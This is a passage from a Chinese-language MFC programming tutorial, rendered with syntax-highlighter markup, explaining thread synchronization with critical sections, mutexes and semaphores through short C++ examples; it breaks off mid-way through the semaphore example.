!important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b4b473049698-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b4b473049698-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b4b473049698-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b4b473049698-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b4b473049698-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b4b473049698-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b4b473049698-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b4b473049698-1\"><span class=\"crayon-t\">Void</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CtestView</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">OnDestroy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b4b473049698-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b4b473049698-3\">　<span class=\"crayon-v\">threadEnd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">SetEvent</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b4b473049698-4\">　<span class=\"crayon-e\">WaitForSingleObject</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pThread</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">m_hThread</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">INFINITE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b4b473049698-5\">　<span class=\"crayon-e\">delete </span><span class=\"crayon-v\">pThread</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b4b473049698-6\">　<span class=\"crayon-v\">Cview</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">OnDestroy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b4b473049698-7\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>运行这个程序，当关闭程序时，才显示提示框，显示”Thread ended”。</p>\n<h2>4、线程之间的同步</h2>\n<p>前面我们讲过，各个线程可以访问进程中的公共变量，所以使用多线程的过程中需要注意的问题是如何防止两个或两个以上的线程同时访问同一个数据，以免破坏数据的完整性。保证各个线程可以在一起适当的协调工作称为线程之间的同步。前面一节介绍的事件对象实际上就是一种同步形式。Visual C++中使用同步类来解决操作系统的并行性而引起的数据不安全的问题，MFC支持的七个多线程的同步类可以分成两大类：同步对象（CsyncObject、Csemaphore、Cmutex、CcriticalSection和Cevent）和同步访问对象（CmultiLock和CsingleLock）。本节主要介绍临界区（critical section）、互斥（mutexe）、信号量（semaphore），这些同步对象使各个线程协调工作，程序运行起来更安全。</p>\n<h3>（一） 临界区</h3>\n<p>临界区是保证在某一个时间只有一个线程可以访问数据的方法。使用它的过程中，需要给各个线程提供一个共享的临界区对象，无论哪个线程占有临界区对象，都可以访问受到保护的数据，这时候其它的线程需要等待，直到该线程释放临界区对象为止，临界区被释放后，另外的线程可以强占这个临界区，以便访问共享的数据。临界区对应着一个CcriticalSection对象，当线程需要访问保护数据时，调用临界区对象的Lock()成员函数；当对保护数据的操作完成之后，调用临界区对象的Unlock()成员函数释放对临界区对象的拥有权，以使另一个线程可以夺取临界区对象并访问受保护的数据。同时启动两个线程，它们对应的函数分别为WriteThread()和ReadThread()，用以对公共数组组array[]操作，下面的代码说明了如何使用临界区对象：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b50810046732\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include \"afxmt.h\"\r\nint array[10],destarray[10];\r\nCCriticalSection Section;\r\nUINT WriteThread(LPVOID param)\r\n{\r\n　Section.Lock();\r\n　for(int x=0;x&lt;10;x++)\r\n　　array[x]=x;\r\n　Section.Unlock();\r\n}\r\nUINT ReadThread(LPVOID param)\r\n{\r\n　Section.Lock();\r\n　For(int x=0;x&lt;10;x++)\r\n　　Destarray[x]=array[x];\r\n　　Section.Unlock();\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b50810046732-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b50810046732-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b50810046732-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b50810046732-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b50810046732-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b50810046732-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b50810046732-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b50810046732-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b50810046732-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b50810046732-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b50810046732-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b50810046732-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b50810046732-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b50810046732-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b50810046732-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b50810046732-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b50810046732-17\">17</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b50810046732-1\"><span class=\"crayon-p\">#include \"afxmt.h\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b50810046732-2\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">destarray</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b50810046732-3\"><span class=\"crayon-e\">CCriticalSection </span><span class=\"crayon-v\">Section</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b50810046732-4\"><span class=\"crayon-e\">UINT </span><span class=\"crayon-e\">WriteThread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">LPVOID </span><span class=\"crayon-v\">param</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b50810046732-5\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b50810046732-6\">　<span class=\"crayon-v\">Section</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Lock</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b50810046732-7\">　<span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b50810046732-8\">　　<span class=\"crayon-t\">array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b50810046732-9\">　<span class=\"crayon-v\">Section</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Unlock</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b50810046732-10\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b50810046732-11\"><span class=\"crayon-e\">UINT </span><span class=\"crayon-e\">ReadThread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">LPVOID </span><span class=\"crayon-v\">param</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b50810046732-12\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b50810046732-13\">　<span class=\"crayon-v\">Section</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Lock</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b50810046732-14\">　<span class=\"crayon-st\">For</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b50810046732-15\">　　<span class=\"crayon-v\">Destarray</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b50810046732-16\">　　<span class=\"crayon-v\">Section</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Unlock</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b50810046732-17\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0022 seconds] -->\r\n<p>上述代码运行的结果应该是Destarray数组中的元素分别为1-9，而不是杂乱无章的数，如果不使用同步，则不是这个结果，有兴趣的读者可以实验一下。</p>\n<h3>（二）互斥</h3>\n<p>互斥与临界区很相似，但是使用时相对复杂一些，它不仅可以在同一应用程序的线程间实现同步，还可以在不同的进程间实现同步，从而实现资源的安全共享。互斥与Cmutex类的对象相对应，使用互斥对象时，必须创建一个CSingleLock或CMultiLock对象，用于实际的访问控制，因为这里的例子只处理单个互斥，所以我们可以使用CSingleLock对象，该对象的Lock()函数用于占有互斥，Unlock()用于释放互斥。实现代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b54561872433\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include \"afxmt.h\"\r\nint array[10],destarray[10];\r\nCMutex Section;\r\n\r\nUINT WriteThread(LPVOID param)\r\n{\r\n　CsingleLock singlelock;\r\n　singlelock (&amp;Section);\r\n　singlelock.Lock();\r\n　for(int x=0;x&lt;10;x++)\r\n　　array[x]=x;\r\n　singlelock.Unlock();\r\n}\r\n\r\nUINT ReadThread(LPVOID param)\r\n{\r\n　CsingleLock singlelock;\r\n　singlelock (&amp;Section);\r\n　singlelock.Lock();\r\n　For(int x=0;x&lt;10;x++)\r\n　　Destarray[x]=array[x];\r\n　　singlelock.Unlock();\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b54561872433-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b54561872433-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b54561872433-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b54561872433-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b54561872433-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b54561872433-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b54561872433-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b54561872433-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b54561872433-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b54561872433-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b54561872433-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b54561872433-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b54561872433-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b54561872433-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b54561872433-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b54561872433-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b54561872433-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b54561872433-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b54561872433-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b54561872433-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b54561872433-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b54561872433-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b54561872433-23\">23</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b54561872433-1\"><span class=\"crayon-p\">#include \"afxmt.h\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b54561872433-2\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">destarray</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b54561872433-3\"><span class=\"crayon-e\">CMutex </span><span class=\"crayon-v\">Section</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b54561872433-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b54561872433-5\"><span class=\"crayon-e\">UINT </span><span class=\"crayon-e\">WriteThread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">LPVOID </span><span class=\"crayon-v\">param</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b54561872433-6\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b54561872433-7\">　<span class=\"crayon-e\">CsingleLock </span><span class=\"crayon-v\">singlelock</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b54561872433-8\">　<span class=\"crayon-e\">singlelock</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">Section</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b54561872433-9\">　<span class=\"crayon-v\">singlelock</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Lock</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b54561872433-10\">　<span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b54561872433-11\">　　<span class=\"crayon-t\">array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b54561872433-12\">　<span class=\"crayon-v\">singlelock</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Unlock</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b54561872433-13\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b54561872433-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b54561872433-15\"><span class=\"crayon-e\">UINT </span><span class=\"crayon-e\">ReadThread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">LPVOID </span><span class=\"crayon-v\">param</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b54561872433-16\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b54561872433-17\">　<span class=\"crayon-e\">CsingleLock </span><span class=\"crayon-v\">singlelock</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b54561872433-18\">　<span class=\"crayon-e\">singlelock</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">Section</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b54561872433-19\">　<span class=\"crayon-v\">singlelock</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Lock</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b54561872433-20\">　<span class=\"crayon-st\">For</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b54561872433-21\">　　<span class=\"crayon-v\">Destarray</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b54561872433-22\">　　<span class=\"crayon-v\">singlelock</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Unlock</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b54561872433-23\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0026 seconds] -->\r\n<p></p>\n<h3>（三）信号量</h3>\n<p>信号量的用法和互斥的用法很相似，不同的是它可以同一时刻允许多个线程访问同一个资源，创建一个信号量需要用Csemaphore类声明一个对象，一旦创建了一个信号量对象，就可以用它来对资源的访问技术。要实现计数处理，先创建一个CsingleLock或CmltiLock对象，然后用该对象的Lock()函数减少这个信号量的计数值，Unlock()反之。下面的代码分别启动三个线程，执行时同时显示二个消息框，然后10秒后第三个消息框才得以显示。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b58374268334\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCsemaphore *semaphore;\r\nSemaphore=new Csemaphore(2,2);\r\nHWND hWnd=GetSafeHwnd();\r\nAfxBeginThread(threadProc1,hWnd);\r\nAfxBeginThread(threadProc2,hWnd);\r\nAfxBeginThread(threadProc3,hWnd);\r\nUINT ThreadProc1(LPVOID param)\r\n{\r\n　CsingleLock singelLock(semaphore);\r\n　singleLock.Lock();\r\n　Sleep(10000);\r\n　::MessageBox((HWND)param,\"Thread1 had access\",\"Thread1\",MB_OK);\r\n　return 0;\r\n}\r\nUINT ThreadProc2(LPVOID param)\r\n{\r\n　CSingleLock singelLock(semaphore);\r\n　singleLock.Lock();\r\n　Sleep(10000);\r\n　::MessageBox((HWND)param,\"Thread2 had access\",\"Thread2\",MB_OK);\r\n　return 0;\r\n}\r\n\r\nUINT ThreadProc3(LPVOID param)\r\n{\r\n　CsingleLock singelLock(semaphore);\r\n　singleLock.Lock();\r\n　Sleep(10000);\r\n　::MessageBox((HWND)param,\"Thread3 had access\",\"Thread3\",MB_OK);\r\n　return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div 